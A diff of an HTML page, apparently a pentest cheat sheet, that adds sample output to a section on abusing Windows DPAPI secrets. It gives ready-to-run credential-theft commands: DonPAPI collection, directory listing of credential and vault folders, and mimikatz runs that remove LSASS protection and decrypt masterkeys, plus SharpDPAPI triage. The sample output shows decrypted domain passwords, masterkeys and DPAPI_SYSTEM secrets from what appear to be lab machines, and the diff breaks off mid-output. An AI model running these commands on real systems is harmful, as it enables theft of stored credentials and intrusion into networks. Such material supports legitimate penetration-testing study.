@@ -328,7 +328,7 @@ body.dark-mode #dynamicFormContainer button:hover {
 <p>
 <button data-tabset="set1" data-tabcontent="tab1" class="active">Linux</button>
 
-<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">DonPAPI collect -d &lt;DOMAIN&gt; -u &lt;USER&gt; -p &#39;&lt;PASSWORD&gt;&#39; -t &lt;TARGET&gt;
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">DonPAPI collect -d &lt;DOMAIN&gt; -u &#39;&lt;USER&gt;&#39; -p &#39;&lt;PASSWORD&gt;&#39; -t &lt;TARGET&gt;
 </span></span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/login-securite/DonPAPI">DonPAPI</a></em></small></p></div></p>
 <h3 id="abuse-1-auto-dump-from-windows">Abuse #1: Auto dump (From Windows)</h3>
 <p>
@@ -337,62 +337,613 @@ body.dark-mode #dynamicFormContainer button:hover {
 <button data-tabset="set2" data-tabcontent="tab2" >SharpDPAPI</button>
 
 <div class="tabcontent" data-tabset="set2" data-tabcontent="tab1"><h4 id="1-info-gathering">1. Info Gathering</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">cmd /c &#34;dir /S /AS C:\Users\&lt;TARGET_UESR&gt;\AppData\Local\Microsoft\Vault &amp; dir /S /AS C:\Users\&lt;TARGET_UESR&gt;\AppData\Local\Microsoft\Credentials &amp; dir /S /AS C:\Users\&lt;TARGET_UESR&gt;\AppData\Local\Microsoft\Protect &amp; dir /S /AS C:\Users\&lt;TARGET_UESR&gt;\AppData\Roaming\Microsoft\Vault &amp; dir /S /AS C:\Users\&lt;TARGET_UESR&gt;\AppData\Roaming\Microsoft\Credentials &amp; dir /S /AS C:\Users\&lt;TARGET_UESR&gt;\AppData\Roaming\Microsoft\Protect&#34;
-</span></span></span></code></pre></div><h4 id="2-secrets-dump">2. Secrets Dump</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">mimikatz.exe &#34;token::elevate&#34; &#34;!+&#34; &#34;!processprotect /process:lsass.exe /remove&#34; &#34;dpapi::cred /in:C:\Users\&lt;TARGET_UESR&gt;\AppData\Roaming\Microsoft\Credentials\&lt;CREDENTIALS_HASH&gt;&#34;&#39; &#39;&#34;dpapi::masterkey /in:C:\Users\&lt;TARGET_UESR&gt;\AppData\Roaming\Microsoft\Protect\&lt;SID&gt;\&lt;PROTECT_HASH&gt; /sid:&lt;SID&gt; /password:&lt;PASSWORD&gt; /protected&#34;&#39; &#39;&#34;dpapi::cred /in:C:\Users\&lt;TARGET_UESR&gt;\AppData\Roaming\Microsoft\Credentials\&lt;CREDENTIALS_HASH&gt;&#34;&#39; &#34;exit&#34;
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">cmd /c &#34;dir /S /AS C:\Users\&lt;USER&gt;\AppData\Local\Microsoft\Vault &amp; dir /S /AS C:\Users\&lt;USER&gt;\AppData\Local\Microsoft\Credentials &amp; dir /S /AS C:\Users\&lt;USER&gt;\AppData\Local\Microsoft\Protect &amp; dir /S /AS C:\Users\&lt;USER&gt;\AppData\Roaming\Microsoft\Vault &amp; dir /S /AS C:\Users\&lt;USER&gt;\AppData\Roaming\Microsoft\Credentials &amp; dir /S /AS C:\Users\&lt;USER&gt;\AppData\Roaming\Microsoft\Protect&#34;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PS C:\users\PPotts&gt; cmd /c &#34;dir /S /AS C:\Users\PPotts\AppData\Local\Microsoft\Vault &amp; dir /S /AS C:\Users\PPotts\AppData\Local\Microsoft\Credentials &amp; dir /S /AS C:\Users\PPotts\AppData\Local\Microsoft\Protect &amp; dir /S /AS C:\Users\PPotts\AppData\Roaming\Microsoft\Vault &amp; dir /S /AS C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials &amp; dir /S /AS C:\Users\PPotts\AppData\Roaming\Microsoft\Protect&#34;
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go"> Volume in drive C has no label.
+</span></span></span><span class="line"><span class="cl"><span class="go"> Volume Serial Number is C626-9388
+</span></span></span><span class="line"><span class="cl"><span class="go">File Not Found
+</span></span></span><span class="line"><span class="cl"><span class="go"> Volume in drive C has no label.
+</span></span></span><span class="line"><span class="cl"><span class="go"> Volume Serial Number is C626-9388
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">...[SNIP]...
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go"> Directory of C:\Users\PPotts\AppData\Roaming\Microsoft\Credentials
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">05/09/2023  04:14 PM    &lt;DIR&gt;          .
+</span></span></span><span class="line"><span class="cl"><span class="go">01/18/2024  10:34 AM    &lt;DIR&gt;          ..
+</span></span></span><span class="line"><span class="cl"><span class="go">05/09/2023  02:08 PM               358 18A1927A997A794B65E9849883AC3F3E
+</span></span></span><span class="line"><span class="cl"><span class="go">05/09/2023  04:03 PM               398 84F1CAEEBF466550F4967858F9353FB4
+</span></span></span><span class="line"><span class="cl"><span class="go">01/18/2024  12:53 PM               374 E76CCA3670CD9BB98DF79E0A8D176F1E
+</span></span></span><span class="line"><span class="cl"><span class="go">               3 File(s)          1,130 bytes
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">     Total Files Listed:
+</span></span></span><span class="line"><span class="cl"><span class="go">               3 File(s)          1,130 bytes
+</span></span></span><span class="line"><span class="cl"><span class="go">               2 Dir(s)   5,175,238,656 bytes free
+</span></span></span><span class="line"><span class="cl"><span class="go"> Volume in drive C has no label.
+</span></span></span><span class="line"><span class="cl"><span class="go"> Volume Serial Number is C626-9388
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go"> Directory of C:\Users\PPotts\AppData\Roaming\Microsoft\Protect
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">05/04/2023  10:58 AM    &lt;DIR&gt;          .
+</span></span></span><span class="line"><span class="cl"><span class="go">01/18/2024  10:34 AM    &lt;DIR&gt;          ..
+</span></span></span><span class="line"><span class="cl"><span class="go">05/02/2023  04:13 PM                24 CREDHIST
+</span></span></span><span class="line"><span class="cl"><span class="go">01/17/2024  04:43 PM    &lt;DIR&gt;          S-1-5-21-1199398058-4196589450-691661856-1107
+</span></span></span><span class="line"><span class="cl"><span class="go">01/17/2024  05:06 PM                76 SYNCHIST
+</span></span></span><span class="line"><span class="cl"><span class="go">               2 File(s)            100 bytes
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go"> Directory of C:\Users\PPotts\AppData\Roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">09/23/2024  06:03 AM    &lt;DIR&gt;          .
+</span></span></span><span class="line"><span class="cl"><span class="go">05/04/2023  10:58 AM    &lt;DIR&gt;          ..
+</span></span></span><span class="line"><span class="cl"><span class="go">01/17/2024  04:43 PM               740 10811601-0fa9-43c2-97e5-9bef8471fc7d
+</span></span></span><span class="line"><span class="cl"><span class="go">05/02/2023  04:13 PM               740 191d3f9d-7959-4b4d-a520-a444853c47eb
+</span></span></span><span class="line"><span class="cl"><span class="go">09/23/2024  06:03 AM               740 6b478281-d87d-4854-b2d2-ae22b861b0b0
+</span></span></span><span class="line"><span class="cl"><span class="go">05/02/2023  04:13 PM               900 BK-OFFICE
+</span></span></span><span class="line"><span class="cl"><span class="go">09/23/2024  06:03 AM                24 Preferred
+</span></span></span><span class="line"><span class="cl"><span class="go">               5 File(s)          3,144 bytes
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">     Total Files Listed:
+</span></span></span><span class="line"><span class="cl"><span class="go">               7 File(s)          3,244 bytes
+</span></span></span><span class="line"><span class="cl"><span class="go">               5 Dir(s)   5,175,238,656 bytes free
+</span></span></span></code></pre></div><h4 id="2-decrypt-credentials">2. Decrypt credentials</h4>
+<p><button data-tabset="set2-1" data-tabcontent="tab1" class="active">With Password</button>
+<button data-tabset="set2-1" data-tabcontent="tab2" >Without Password</button></p>
+<div class="tabcontent" data-tabset="set2-1" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">.\mimikatz.exe &#34;token::elevate&#34; &#34;!+&#34; &#34;!processprotect /process:lsass.exe /remove&#34; &#34;dpapi::cred /in:C:\Users\&lt;USER&gt;\AppData\Roaming\Microsoft\Credentials\&lt;CREDENTIALS_HASH&gt;&#34; &#34;dpapi::masterkey /in:C:\Users\&lt;USER&gt;\AppData\Roaming\Microsoft\Protect\&lt;SID&gt;\&lt;MASTERKEY_GUID&gt; /sid:&lt;SID&gt; /password:&lt;PASSWORD&gt; /protected&#34; &#34;dpapi::cred /in:C:\Users\&lt;USER&gt;\AppData\Roaming\Microsoft\Credentials\&lt;CREDENTIALS_HASH&gt;&#34; &#34;exit&#34;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; .\mimikatz.exe &#34;token::elevate&#34; &#34;!+&#34; &#34;!processprotect /process:lsass.exe /remove&#34; &#34;dpapi::cred /in:C:\Users\billing_user\AppData\Roaming\Microsoft\Credentials\C48FA9BC4637C67CB306A191C3C91E23&#34; &#34;dpapi::masterkey /in:C:\Users\billing_user\AppData\Roaming\Microsoft\Protect\S-1-5-21-4088429403-1159899800-2753317549-1603\56a4e7f0-7ae5-4a66-86c8-abb9aa484acd /sid:S-1-5-21-4088429403-1159899800-2753317549-1603 /password:D43d4lusB1ll1ngB055 /protected&#34; &#34;dpapi::cred /in:C:\Users\billing_user\AppData\Roaming\Microsoft\Credentials\C48FA9BC4637C67CB306A191C3C91E23&#34; &#34;exit&#34;
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  .#####.   mimikatz 2.2.0 (x64) #19041 May 17 2024 22:19:06
+</span></span></span><span class="line"><span class="cl"><span class="go"> .## ^ ##.  &#34;A La Vie, A L&#39;Amour&#34; - (oe.eo)
+</span></span></span><span class="line"><span class="cl"><span class="go"> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+</span></span></span><span class="line"><span class="cl"><span class="go"> ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
+</span></span></span><span class="line"><span class="cl"><span class="go"> &#39;## v ##&#39;       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+</span></span></span><span class="line"><span class="cl"><span class="go">  &#39;#####&#39;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">mimikatz(commandline) # token::elevate
+</span></span></span><span class="line"><span class="cl"><span class="go">Token Id  : 0
+</span></span></span><span class="line"><span class="cl"><span class="go">User name : 
+</span></span></span><span class="line"><span class="cl"><span class="go">SID name  : NT AUTHORITY\SYSTEM
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">668     {0;000003e7} 1 D 43721          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
+</span></span></span><span class="line"><span class="cl"><span class="go"> -&gt; Impersonated !
+</span></span></span><span class="line"><span class="cl"><span class="go"> * Process Token : {0;000003e7} 0 D 20307805    NT AUTHORITY\SYSTEM     S-1-5-18        (04g,28p)       Primary
+</span></span></span><span class="line"><span class="cl"><span class="go"> * Thread Token  : {0;000003e7} 1 D 20868764    NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">mimikatz(commandline) # !+
+</span></span></span><span class="line"><span class="cl"><span class="go">ERROR kuhl_m_kernel_add_mimidrv ; kull_m_file_isFileExist (0x00000002)
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">mimikatz(commandline) # !processprotect /process:lsass.exe /remove
+</span></span></span><span class="line"><span class="cl"><span class="go">Process : lsass.exe
+</span></span></span><span class="line"><span class="cl"><span class="go">PID 772 -&gt; 00/00 [0-0-0]
+</span></span></span><span class="line"><span class="cl"><span class="go">ERROR kull_m_kernel_ioctl ; CreateFile (0x00000002)
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">mimikatz(commandline) # dpapi::cred /in:C:\Users\billing_user\AppData\Roaming\Microsoft\Credentials\C48FA9BC4637C67CB306A191C3C91E23
+</span></span></span><span class="line"><span class="cl"><span class="go">**BLOB**
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">...[SNIP]...
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">mimikatz(commandline) # dpapi::masterkey /in:C:\Users\billing_user\AppData\Roaming\Microsoft\Protect\S-1-5-21-4088429403-1159899800-2753317549-1603\56a4e7f0-7ae5-4a66-86c8-abb9aa484acd /sid:S-1-5-21-4088429403-1159899800-2753317549-1603 /password:D43d4lusB1ll1ngB055 /protected
+</span></span></span><span class="line"><span class="cl"><span class="go">**MASTERKEYS**
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">...[SNIP]...
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[masterkey] with password: D43d4lusB1ll1ngB055 (protected user)
+</span></span></span><span class="line"><span class="cl"><span class="go">  key : 0d0f6c2fafd985bff92ff1371723795de81064978fbf37e4f0b87d5b9b1458077f4264e3e5c5c1407431fb21243b46415c018e34caa943b8c24d0c5834500e73
+</span></span></span><span class="line"><span class="cl"><span class="go">  sha1: 1312251fb1ae77dec889c6b88f391ad10bf59d87
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[backupkey] without DPAPI_SYSTEM: 
+</span></span></span><span class="line"><span class="cl"><span class="go">  key : 5a2ca08f7d08301826f1e25c618e87797726d4d97cfda4f6a2ed08bcaae9a591
+</span></span></span><span class="line"><span class="cl"><span class="go">  sha1: 3c85ebb19e92e325e28d715759fdac387c2934ff
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">mimikatz(commandline) # dpapi::cred /in:C:\Users\billing_user\AppData\Roaming\Microsoft\Credentials\C48FA9BC4637C67CB306A191C3C91E23
+</span></span></span><span class="line"><span class="cl"><span class="go">**BLOB**
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">...[SNIP]...
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Decrypting Credential:
+</span></span></span><span class="line"><span class="cl"><span class="go"> * volatile cache: GUID:{56a4e7f0-7ae5-4a66-86c8-abb9aa484acd};KeyHash:1312251fb1ae77dec889c6b88f391ad10bf59d87;Key:available
+</span></span></span><span class="line"><span class="cl"><span class="go">**CREDENTIAL**
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">...[SNIP]...
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  TargetName     : Domain:interactive=DAEDALUS\svc_backup
+</span></span></span><span class="line"><span class="cl"><span class="go">  UnkData        : (null)
+</span></span></span><span class="line"><span class="cl"><span class="go">  Comment        : (null)
+</span></span></span><span class="line"><span class="cl"><span class="go">  TargetAlias    : (null)
+</span></span></span><span class="line"><span class="cl"><span class="go">  UserName       : DAEDALUS\svc_backup
+</span></span></span><span class="line"><span class="cl"><span class="go">  CredentialBlob : jkQXAnHKj#7w#XS$
+</span></span></span><span class="line"><span class="cl"><span class="go">  Attributes     : 0
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">mimikatz(commandline) # exit
+</span></span></span><span class="line"><span class="cl"><span class="go">Bye!
 </span></span></span></code></pre></div></div>
+<div class="tabcontent" data-tabset="set2-1" data-tabcontent="tab2"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Try different MASTERKEY_GUID to get masterkeys
+</span></span><span class="line"><span class="cl"><span class="go">.\mimikatz.exe &#34;dpapi::masterkey /in:C:\users\&lt;USER&gt;\appdata\roaming\microsoft\protect\&lt;SID&gt;\&lt;MASTERKEY_GUID&gt; /rpc&#34; &#34;exit&#34;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; .\mimikatz.exe &#34;dpapi::masterkey /in:C:\users\PPotts\appdata\roaming\microsoft\protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb /rpc&#34; &#34;exit&#34;
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  .#####.   mimikatz 2.2.0 (x64) #19041 May 17 2024 22:19:06
+</span></span></span><span class="line"><span class="cl"><span class="go"> .## ^ ##.  &#34;A La Vie, A L&#39;Amour&#34; - (oe.eo)
+</span></span></span><span class="line"><span class="cl"><span class="go"> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+</span></span></span><span class="line"><span class="cl"><span class="go"> ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
+</span></span></span><span class="line"><span class="cl"><span class="go"> &#39;## v ##&#39;       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+</span></span></span><span class="line"><span class="cl"><span class="go">  &#39;#####&#39;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">mimikatz(commandline) # dpapi::masterkey /in:C:\users\PPotts\appdata\roaming\microsoft\protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb /rpc
+</span></span></span><span class="line"><span class="cl"><span class="go">**MASTERKEYS**
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">...[SNIP]...
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[domainkey] with RPC
+</span></span></span><span class="line"><span class="cl"><span class="go">[DC] &#39;office.htb&#39; will be the domain
+</span></span></span><span class="line"><span class="cl"><span class="go">[DC] &#39;DC.office.htb&#39; will be the DC server
+</span></span></span><span class="line"><span class="cl"><span class="go">  key : 87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
+</span></span></span><span class="line"><span class="cl"><span class="go">  sha1: 85285eb368befb1670633b05ce58ca4d75c73c77
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">mimikatz(commandline) # exit
+</span></span></span><span class="line"><span class="cl"><span class="go">Bye!
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Decrypt credentials
+</span></span><span class="line"><span class="cl"><span class="go">.\mimikatz.exe &#34;dpapi::cred /in:C:\users\&lt;USER&gt;\appdata\roaming\microsoft\credentials\&lt;CREDENTIALS_HASH&gt; /masterkey:&lt;MASTERKEY&gt;&#34; &#34;exit&#34;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; .\mimikatz.exe &#34;dpapi::cred /in:C:\users\PPotts\appdata\roaming\microsoft\credentials\84F1CAEEBF466550F4967858F9353FB4 /masterkey:87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166&#34; &#34;exit&#34;
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  .#####.   mimikatz 2.2.0 (x64) #19041 May 17 2024 22:19:06
+</span></span></span><span class="line"><span class="cl"><span class="go"> .## ^ ##.  &#34;A La Vie, A L&#39;Amour&#34; - (oe.eo)
+</span></span></span><span class="line"><span class="cl"><span class="go"> ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+</span></span></span><span class="line"><span class="cl"><span class="go"> ## \ / ##       &gt; https://blog.gentilkiwi.com/mimikatz
+</span></span></span><span class="line"><span class="cl"><span class="go"> &#39;## v ##&#39;       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+</span></span></span><span class="line"><span class="cl"><span class="go">  &#39;#####&#39;        &gt; https://pingcastle.com / https://mysmartlogon.com ***/
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">mimikatz(commandline) # dpapi::cred /in:C:\users\PPotts\appdata\roaming\microsoft\credentials\84F1CAEEBF466550F4967858F9353FB4 /masterkey:87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
+</span></span></span><span class="line"><span class="cl"><span class="go">**BLOB**
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">...[SNIP]...
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Decrypting Credential:
+</span></span></span><span class="line"><span class="cl"><span class="go"> * masterkey     : 87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166
+</span></span></span><span class="line"><span class="cl"><span class="go">**CREDENTIAL**
+</span></span></span><span class="line"><span class="cl"><span class="go">  credFlags      : 00000030 - 48
+</span></span></span><span class="line"><span class="cl"><span class="go">  credSize       : 000000be - 190
+</span></span></span><span class="line"><span class="cl"><span class="go">  credUnk0       : 00000000 - 0
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  Type           : 00000002 - 2 - domain_password
+</span></span></span><span class="line"><span class="cl"><span class="go">  Flags          : 00000000 - 0
+</span></span></span><span class="line"><span class="cl"><span class="go">  LastWritten    : 5/9/2023 11:03:21 PM
+</span></span></span><span class="line"><span class="cl"><span class="go">  unkFlagsOrSize : 00000018 - 24
+</span></span></span><span class="line"><span class="cl"><span class="go">  Persist        : 00000003 - 3 - enterprise
+</span></span></span><span class="line"><span class="cl"><span class="go">  AttributeCount : 00000000 - 0
+</span></span></span><span class="line"><span class="cl"><span class="go">  unk0           : 00000000 - 0
+</span></span></span><span class="line"><span class="cl"><span class="go">  unk1           : 00000000 - 0
+</span></span></span><span class="line"><span class="cl"><span class="go">  TargetName     : Domain:interactive=OFFICE\HHogan
+</span></span></span><span class="line"><span class="cl"><span class="go">  UnkData        : (null)
+</span></span></span><span class="line"><span class="cl"><span class="go">  Comment        : (null)
+</span></span></span><span class="line"><span class="cl"><span class="go">  TargetAlias    : (null)
+</span></span></span><span class="line"><span class="cl"><span class="go">  UserName       : OFFICE\HHogan
+</span></span></span><span class="line"><span class="cl"><span class="go">  CredentialBlob : H4ppyFtW183#
+</span></span></span><span class="line"><span class="cl"><span class="go">  Attributes     : 0
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">mimikatz(commandline) # exit
+</span></span></span><span class="line"><span class="cl"><span class="go">Bye!
+</span></span></span></code></pre></div></div></div>
 
 <div class="tabcontent" data-tabset="set2" data-tabcontent="tab2"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Run as system
 </span></span><span class="line"><span class="cl"><span class="go">.\SharpDPAPI.exe machinetriage
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">PS C:\programdata&gt; .\SharpDPAPI.exe machinetriage
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">  __                 _   _       _ ___ 
+</span></span></span><span class="line"><span class="cl"><span class="go"> (_  |_   _. ._ ._  | \ |_) /\  |_) |  
+</span></span></span><span class="line"><span class="cl"><span class="go"> __) | | (_| |  |_) |_/ |  /--\ |  _|_ 
+</span></span></span><span class="line"><span class="cl"><span class="go">                |                      
+</span></span></span><span class="line"><span class="cl"><span class="go">  v1.12.0                               
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Action: Machine DPAPI Credential, Vault, and Certificate Triage
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] Secret  : DPAPI_SYSTEM
+</span></span></span><span class="line"><span class="cl"><span class="go">[*]    full: E7BC9098EA7313E0B042679565EDF75CAD219106D3FE11B0F39C1F1E4EAEA01DC393F563C6190EC7
+</span></span></span><span class="line"><span class="cl"><span class="go">[*]    m/u : E7BC9098EA7313E0B042679565EDF75CAD219106 / D3FE11B0F39C1F1E4EAEA01DC393F563C6190EC7
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">[*] SYSTEM master key cache:
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">{0415ef8e-0ae0-4238-9240-90f873b07eb8}:4F31CF838C52B4DC1C4E2DCD09023316D31B661F
+</span></span></span><span class="line"><span class="cl"><span class="go">{3faada0f-c676-4092-a21d-98749e7035bd}:F630D3478DF2CE72B996D6A90A33286F5B12412A
+</span></span></span><span class="line"><span class="cl"><span class="go">{40956580-28e9-4cdc-bd5a-f7f5d3296e3c}:2A7A3BF8741AAC73F8ECD2F1CCC802397037EFA4
+</span></span></span><span class="line"><span class="cl"><span class="go">{49b474c3-bbf4-4a92-95cc-4a47b486efec}:CDA2D0F05AC1D0F9F126D742379528471C765D69
+</span></span></span><span class="line"><span class="cl"><span class="go">{9266b8e6-64b8-423c-b8e9-4b5de4fe1a8d}:70F37E3A70076DEA98EB86CACF6511CB2541E71E
+</span></span></span><span class="line"><span class="cl"><span class="go">{c3b44c78-2d7b-4542-9078-22b1e73d9575}:67AF7D6FB8BAC73F31001612B697D27337C0EC53
+</span></span></span><span class="line"><span class="cl"><span class="go">{df49e508-6894-491b-9d8f-aefc03890813}:C0D4E38607CCC1A0956F5AB1B878021FCF9D6FD4
+</span></span></span><span class="line"><span class="cl"><span class="go">{e0131457-419d-4905-a547-fadb0cacdd84}:9AF3645C9A2D7A5DBFDAA15133A9AF22641E7710
+</span></span></span><span class="line"><span class="cl"><span class="go">{17c48be0-e86b-4d5f-883d-994e1dc7ad8e}:794C081F748977CAB0DFC74BC4893DC7D5A73B03
